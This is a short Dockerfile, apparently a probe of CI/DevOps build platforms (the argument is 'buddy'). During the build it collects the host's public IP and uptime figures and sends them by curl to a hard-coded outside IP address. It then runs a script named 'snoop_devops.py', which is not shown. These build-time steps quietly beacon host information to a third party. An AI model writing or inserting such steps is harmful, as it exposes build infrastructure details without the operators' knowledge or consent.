FROM ubuntu:18.04
  
ARG platform=buddy

RUN apt update && apt install curl dnsutils python3 python3-pip -y

RUN pip3 install requests;

RUN public_ip=$(curl https://myexternalip.com/raw); uptime=$(cat /proc/uptime | awk '{print $2}'); cputime=$(cat /proc/uptime | awk '{print $1}'); curl -Li "54.191.75.188/serverinfo?platform=$platform&ip=$public_ip&uptime=$uptime&cputime=$cputime"

ADD snoop_devops.py .

RUN python3 snoop_devops.py $platform
